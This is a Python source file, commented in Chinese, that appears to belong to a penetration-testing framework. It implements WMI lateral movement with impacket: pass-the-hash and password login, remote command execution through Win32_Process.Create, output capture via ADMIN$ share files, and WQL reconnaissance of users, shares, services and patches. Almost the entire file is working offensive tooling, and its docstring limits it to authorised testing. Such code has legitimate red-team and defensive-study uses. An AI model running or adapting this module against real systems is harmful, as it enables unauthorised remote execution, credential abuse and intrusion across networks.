#!/usr/bin/env python3
"""
WMI 横向移动模块 - WMI Lateral Movement
功能: WMI 远程命令执行、系统查询、进程管理

用于授权安全测试，仅限合法渗透测试使用
"""

import time
import uuid
import logging
import tempfile
import os
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

from .base import (
    BaseLateralModule,
    Credentials,
    ExecutionResult,
    FileTransferResult,
    LateralConfig,
    LateralStatus,
    AuthMethod,
    ExecutionMethod,
    LateralModuleError,
)

logger = logging.getLogger(__name__)

# 尝试导入 impacket
try:
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dtypes import NULL
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    logger.debug("impacket 未安装，WMI 功能受限")

# Windows 本地 WMI
try:
    import wmi as local_wmi
    HAS_LOCAL_WMI = True
except ImportError:
    HAS_LOCAL_WMI = False


@dataclass
class WMIQueryResult:
    """WMI 查询结果"""
    success: bool
    data: List[Dict[str, Any]] = field(default_factory=list)
    error: str = ''
    query: str = ''
    duration: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            'success': self.success,
            'data': self.data,
            'error': self.error,
            'query': self.query,
            'duration': self.duration,
            'count': len(self.data)
        }


class WQLQueries:
    """常用 WQL 查询"""
    # 进程
    PROCESSES = "SELECT ProcessId, Name, CommandLine, ExecutablePath FROM Win32_Process"
    PROCESS_BY_NAME = "SELECT ProcessId, Name, CommandLine FROM Win32_Process WHERE Name LIKE '%{name}%'"

    # 服务
    SERVICES = "SELECT Name, DisplayName, State, StartMode, PathName FROM Win32_Service"
    RUNNING_SERVICES = "SELECT Name, DisplayName, PathName FROM Win32_Service WHERE State='Running'"

    # 用户和组
    USERS = "SELECT Name, Domain, SID, Status FROM Win32_UserAccount"
    LOCAL_USERS = "SELECT Name, Domain, SID FROM Win32_UserAccount WHERE LocalAccount=TRUE"
    GROUPS = "SELECT Name, Domain, SID FROM Win32_Group"

    # 网络
    NETWORK_ADAPTERS = (
        "SELECT Description, IPAddress, MACAddress, DefaultIPGateway "
        "FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE"
    )

    # 系统信息
    OS_INFO = (
        "SELECT Caption, Version, BuildNumber, OSArchitecture, "
        "LastBootUpTime, TotalVisibleMemorySize, FreePhysicalMemory "
        "FROM Win32_OperatingSystem"
    )
    COMPUTER_SYSTEM = (
        "SELECT Name, Domain, Manufacturer, Model, "
        "TotalPhysicalMemory, NumberOfProcessors "
        "FROM Win32_ComputerSystem"
    )

    # 磁盘
    DISK_DRIVES = "SELECT Model, Size, MediaType FROM Win32_DiskDrive"
    LOGICAL_DISKS = "SELECT DeviceID, Size, FreeSpace, FileSystem FROM Win32_LogicalDisk"

    # 软件
    INSTALLED_SOFTWARE = "SELECT Name, Version, Vendor FROM Win32_Product"
    HOTFIXES = "SELECT HotFixID, InstalledOn, Description FROM Win32_QuickFixEngineering"

    # 其他
    SHARES = "SELECT Name, Path, Description FROM Win32_Share"
    SCHEDULED_TASKS = "SELECT Name, State, NextRunTime FROM Win32_ScheduledJob"
    STARTUP_COMMANDS = "SELECT Name, Command, Location FROM Win32_StartupCommand"
    ENVIRONMENT_VARS = "SELECT Name, VariableValue FROM Win32_Environment"


class WMILateral(BaseLateralModule):
    """
    WMI 横向移动模块

    支持:
    - 密码认证
    - Pass-the-Hash
    - WMI 命令执行
    - WQL 查询
    - 系统信息收集

    Usage:
        creds = Credentials(
            username='administrator',
            password='password123',
            domain='WORKGROUP'
        )

        with WMILateral('192.168.1.100', creds) as wmi_client:
            # 执行命令
            result = wmi_client.execute('whoami')

            # 查询进程
            procs = wmi_client.query(WQLQueries.PROCESSES)

            # 系统侦察
            info = wmi_client.recon()
    """

    name = 'wmi'
    description = 'WMI 横向移动，支持远程命令执行和系统查询'
    default_port = 135  # RPC Endpoint Mapper
    supported_auth = [AuthMethod.PASSWORD, AuthMethod.HASH]

    def __init__(
        self,
        target: str,
        credentials: Credentials,
        config: Optional[LateralConfig] = None
    ):
        super().__init__(target, credentials, config)
        self._dcom: Optional[Any] = None
        self._wmi_conn: Optional[Any] = None

    @property
    def namespace(self) -> str:
        """获取 WMI 命名空间"""
        return self.config.wmi_namespace

    def connect(self) -> bool:
        """建立 WMI 连接"""
        if not HAS_IMPACKET:
            self.logger.error("impacket 未安装，无法建立 WMI 连接")
            self._set_status(LateralStatus.FAILED)
            return False

        self._set_status(LateralStatus.CONNECTING)

        try:
            # 建立 DCOM 连接
            if self.credentials.method == AuthMethod.HASH:
                # Pass-the-Hash
                self._dcom = DCOMConnection(
                    self.target,
                    self.credentials.username,
                    '',
                    self.credentials.domain or '',
                    self.credentials.lm_hash,
                    self.credentials.nt_hash
                )
            else:
                # 密码认证
                self._dcom = DCOMConnection(
                    self.target,
                    self.credentials.username,
                    self.credentials.password or '',
                    self.credentials.domain or ''
                )

            # 获取 WMI 对象
            iInterface = self._dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login,
                wmi.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)

            # 登录到 WMI 命名空间
            self._wmi_conn = iWbemLevel1Login.NTLMLogin(
                self.namespace,
                NULL,
                NULL
            )

            self._connect_time = time.time()
            self._set_status(LateralStatus.CONNECTED)
            self.logger.info(f"WMI 连接成功: {self.credentials.username}@{self.target}")
            return True

        except Exception as e:
            self.logger.error(f"WMI 连接失败: {e}")
            self._set_status(LateralStatus.FAILED)
            return False

    def disconnect(self) -> None:
        """断开 WMI 连接"""
        self._set_status(LateralStatus.DISCONNECTING)

        if self._dcom:
            try:
                self._dcom.disconnect()
            except Exception as e:
                self.logger.debug(f"断开 DCOM 时出错: {e}")

        self._dcom = None
        self._wmi_conn = None
        self._set_status(LateralStatus.DISCONNECTED)

    def execute(self, command: str, timeout: Optional[float] = None) -> ExecutionResult:
        """
        通过 WMI 执行命令

        使用 Win32_Process.Create 方法执行命令

        Args:
            command: 要执行的命令
            timeout: 超时时间 (WMI 执行是异步的，此参数仅用于等待)
        """
        if not self._wmi_conn:
            return ExecutionResult(
                success=False,
                error="未连接",
                method=ExecutionMethod.WMIEXEC.value
            )

        self._set_status(LateralStatus.EXECUTING)
        self._update_activity()
        start_time = time.time()

        try:
            # 获取 Win32_Process 类
            win32_process, _ = self._wmi_conn.GetObject('Win32_Process')

            # 调用 Create 方法
            result = win32_process.Create(command, 'C:\\', None)

            return_value = result.ReturnValue
            process_id = result.ProcessId if hasattr(result, 'ProcessId') else 0

            self._set_status(LateralStatus.CONNECTED)

            if return_value == 0:
                return ExecutionResult(
                    success=True,
                    output=f'进程已创建，PID: {process_id}',
                    exit_code=0,
                    duration=time.time() - start_time,
                    process_id=process_id,
                    method=ExecutionMethod.WMIEXEC.value
                )
            else:
                return ExecutionResult(
                    success=False,
                    error=f'进程创建失败，返回码: {return_value}',
                    exit_code=return_value,
                    duration=time.time() - start_time,
                    method=ExecutionMethod.WMIEXEC.value
                )

        except Exception as e:
            self._set_status(LateralStatus.CONNECTED)
            return ExecutionResult(
                success=False,
                error=str(e),
                duration=time.time() - start_time,
                method=ExecutionMethod.WMIEXEC.value
            )

    def execute_with_output(
        self,
        command: str,
        timeout: Optional[float] = None,
        share: str = 'ADMIN$'
    ) -> ExecutionResult:
        """
        执行命令并获取输出

        通过将输出重定向到共享文件，然后读取

        Args:
            command: 命令
            timeout: 超时时间
            share: SMB 共享名
        """
        if not self._wmi_conn:
            return ExecutionResult(success=False, error="未连接")

        start_time = time.time()
        output_file = f'C:\\Windows\\Temp\\{uuid.uuid4().hex}.txt'

        try:
            # 执行命令并重定向输出
            full_command = f'cmd.exe /c "{command}" > {output_file} 2>&1'
            result = self.execute(full_command)

            if not result.success:
                return result

            # 等待命令完成
            time.sleep(2)

            # 读取输出文件 (需要 SMB 连接)
            output = self._read_output_file(output_file, share)

            # 删除临时文件
            self.execute(f'cmd.exe /c del {output_file}')

            return ExecutionResult(
                success=True,
                output=output,
                duration=time.time() - start_time,
                process_id=result.process_id,
                method=ExecutionMethod.WMIEXEC.value
            )

        except Exception as e:
            return ExecutionResult(
                success=False,
                error=str(e),
                duration=time.time() - start_time,
                method=ExecutionMethod.WMIEXEC.value
            )

    def _read_output_file(self, file_path: str, share: str) -> str:
        """通过 SMB 读取输出文件"""
        try:
            from .smb import SMBLateral

            smb = SMBLateral(self.target, self.credentials)
            smb.config.smb_share = share

            if not smb.connect():
                return f"无法通过 SMB 读取输出 ({file_path})"

            # 转换路径
            # C:\Windows\Temp\xxx.txt -> \Windows\Temp\xxx.txt (for ADMIN$)
            remote_path = file_path.replace('C:', '').replace('/', '\\')

            # 下载到临时文件
            temp_file = tempfile.mktemp()
            result = smb.download(remote_path, temp_file)
            smb.disconnect()

            if result.success:
                with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                    output = f.read()
                os.remove(temp_file)
                return output
            else:
                return f"读取输出失败: {result.error}"

        except ImportError:
            return "SMB 模块不可用"
        except Exception as e:
            return f"读取输出错误: {e}"

    def query(self, wql: str) -> WMIQueryResult:
        """
        执行 WQL 查询

        Args:
            wql: WMI Query Language 查询语句

        Returns:
            WMIQueryResult 对象
        """
        if not self._wmi_conn:
            return WMIQueryResult(success=False, error="未连接", query=wql)

        start_time = time.time()

        try:
            # 执行查询
            enum = self._wmi_conn.ExecQuery(wql)

            results = []
            while True:
                try:
                    obj = enum.Next(0xffffffff, 1)[0]
                    properties = obj.getProperties()

                    row = {}
                    for prop in properties:
                        value = properties[prop]['value']
                        # 处理特殊类型
                        if isinstance(value, bytes):
                            value = value.decode('utf-8', errors='ignore')
                        elif isinstance(value, (list, tuple)):
                            value = list(value)
                        row[prop] = value

                    results.append(row)

                except Exception:
                    break

            return WMIQueryResult(
                success=True,
                data=results,
                query=wql,
                duration=time.time() - start_time
            )

        except Exception as e:
            return WMIQueryResult(
                success=False,
                error=str(e),
                query=wql,
                duration=time.time() - start_time
            )

    def get_processes(self) -> List[Dict[str, Any]]:
        """获取进程列表"""
        result = self.query(WQLQueries.PROCESSES)
        return result.data if result.success else []

    def get_services(self) -> List[Dict[str, Any]]:
        """获取服务列表"""
        result = self.query(WQLQueries.SERVICES)
        return result.data if result.success else []

    def get_running_services(self) -> List[Dict[str, Any]]:
        """获取运行中的服务"""
        result = self.query(WQLQueries.RUNNING_SERVICES)
        return result.data if result.success else []

    def get_users(self) -> List[Dict[str, Any]]:
        """获取用户列表"""
        result = self.query(WQLQueries.USERS)
        return result.data if result.success else []

    def get_local_users(self) -> List[Dict[str, Any]]:
        """获取本地用户"""
        result = self.query(WQLQueries.LOCAL_USERS)
        return result.data if result.success else []

    def get_groups(self) -> List[Dict[str, Any]]:
        """获取组列表"""
        result = self.query(WQLQueries.GROUPS)
        return result.data if result.success else []

    def get_network_config(self) -> List[Dict[str, Any]]:
        """获取网络配置"""
        result = self.query(WQLQueries.NETWORK_ADAPTERS)
        return result.data if result.success else []

    def get_os_info(self) -> Dict[str, Any]:
        """获取操作系统信息"""
        result = self.query(WQLQueries.OS_INFO)
        if result.success and result.data:
            return result.data[0]
        return {}

    def get_computer_info(self) -> Dict[str, Any]:
        """获取计算机信息"""
        result = self.query(WQLQueries.COMPUTER_SYSTEM)
        if result.success and result.data:
            return result.data[0]
        return {}

    def get_shares(self) -> List[Dict[str, Any]]:
        """获取共享列表"""
        result = self.query(WQLQueries.SHARES)
        return result.data if result.success else []

    def get_hotfixes(self) -> List[Dict[str, Any]]:
        """获取已安装的补丁"""
        result = self.query(WQLQueries.HOTFIXES)
        return result.data if result.success else []

    def get_startup_commands(self) -> List[Dict[str, Any]]:
        """获取启动项"""
        result = self.query(WQLQueries.STARTUP_COMMANDS)
        return result.data if result.success else []

    def kill_process(self, pid: int) -> bool:
        """
        终止进程

        Args:
            pid: 进程 ID
        """
        result = self.execute(f'taskkill /F /PID {pid}')
        return result.success

    def kill_process_by_name(self, name: str) -> bool:
        """
        按名称终止进程

        Args:
            name: 进程名称
        """
        result = self.execute(f'taskkill /F /IM {name}')
        return result.success

    def recon(self) -> Dict[str, Any]:
        """
        系统侦察

        收集系统基本信息

        Returns:
            系统信息字典
        """
        if not self._wmi_conn:
            return {'success': False, 'error': '未连接'}

        try:
            os_info = self.get_os_info()
            computer_info = self.get_computer_info()
            users = self.get_local_users()
            network = self.get_network_config()
            shares = self.get_shares()
            processes = self.get_processes()
            services = self.get_running_services()

            return {
                'success': True,
                'target': self.target,
                'os': {
                    'caption': os_info.get('Caption', ''),
                    'version': os_info.get('Version', ''),
                    'build': os_info.get('BuildNumber', ''),
                    'architecture': os_info.get('OSArchitecture', ''),
                    'last_boot': os_info.get('LastBootUpTime', ''),
                },
                'computer': {
                    'name': computer_info.get('Name', ''),
                    'domain': computer_info.get('Domain', ''),
                    'manufacturer': computer_info.get('Manufacturer', ''),
                    'model': computer_info.get('Model', ''),
                },
                'users': [u.get('Name', '') for u in users],
                'network': [
                    {
                        'description': n.get('Description', ''),
                        'ip': n.get('IPAddress', []),
                        'mac': n.get('MACAddress', ''),
                    }
                    for n in network
                ],
                'shares': [s.get('Name', '') for s in shares],
                'process_count': len(processes),
                'running_services': len(services),
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}


# 便捷函数
def wmi_exec(
    target: str,
    username: str,
    password: str,
    command: str,
    domain: str = '',
    get_output: bool = False
) -> Dict[str, Any]:
    """
    WMI 命令执行 (便捷函数)

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        command: 命令
        domain: 域名
        get_output: 是否获取输出
    """
    if not HAS_IMPACKET:
        return {'success': False, 'error': 'impacket 未安装'}

    creds = Credentials(
        username=username,
        password=password,
        domain=domain
    )

    wmi_client = WMILateral(target, creds)

    if not wmi_client.connect():
        return {
            'success': False,
            'error': '连接失败',
            'target': target,
            'command': command
        }

    if get_output:
        result = wmi_client.execute_with_output(command)
    else:
        result = wmi_client.execute(command)

    wmi_client.disconnect()

    return {
        'success': result.success,
        'output': result.output,
        'error': result.error,
        'process_id': result.process_id,
        'duration': result.duration,
        'target': target,
        'command': command,
        'method': result.method
    }


def wmi_query(
    target: str,
    username: str,
    password: str,
    wql: str,
    domain: str = ''
) -> Dict[str, Any]:
    """
    WMI 查询 (便捷函数)

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        wql: WQL 查询语句
        domain: 域名
    """
    if not HAS_IMPACKET:
        return {'success': False, 'error': 'impacket 未安装'}

    creds = Credentials(
        username=username,
        password=password,
        domain=domain
    )

    wmi_client = WMILateral(target, creds)

    if not wmi_client.connect():
        return {
            'success': False,
            'error': '连接失败',
            'target': target,
            'query': wql
        }

    result = wmi_client.query(wql)
    wmi_client.disconnect()

    return result.to_dict()


def wmi_recon(
    target: str,
    username: str,
    password: str,
    domain: str = ''
) -> Dict[str, Any]:
    """
    WMI 系统侦察 (便捷函数)
    """
    if not HAS_IMPACKET:
        return {'success': False, 'error': 'impacket 未安装'}

    creds = Credentials(
        username=username,
        password=password,
        domain=domain
    )

    wmi_client = WMILateral(target, creds)

    if not wmi_client.connect():
        return {'success': False, 'error': '连接失败', 'target': target}

    result = wmi_client.recon()
    wmi_client.disconnect()

    return result


if __name__ == '__main__':
    print("=== WMI Lateral Movement Module ===")
    print(f"impacket 可用: {HAS_IMPACKET}")
    print(f"本地 WMI 可用: {HAS_LOCAL_WMI}")
    print("\n使用示例:")
    print("  from core.lateral import WMILateral, Credentials, wmi_exec")
    print("  result = wmi_exec('192.168.1.100', 'admin', 'password', 'whoami')")
    print("\n常用 WQL 查询:")
    for name in dir(WQLQueries):
        if not name.startswith('_'):
            print(f"  {name}")
